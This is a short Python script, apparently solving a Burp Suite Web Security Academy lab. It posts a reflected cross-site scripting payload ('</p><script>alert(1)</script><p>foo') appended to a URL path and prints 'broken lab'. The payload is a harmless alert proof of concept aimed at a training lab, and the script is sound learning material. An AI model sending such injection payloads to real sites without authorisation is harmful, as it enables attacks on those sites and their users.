import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
delivery = burp_url + '/deliver-to-victim'

session = requests.Session()
answer = burp_url + '/random</p><script>alert(1)</script><p>foo'
print(answer)
burp_data = {"answer": answer}
session.post(burp_url, data=burp_data)

print("broken lab")
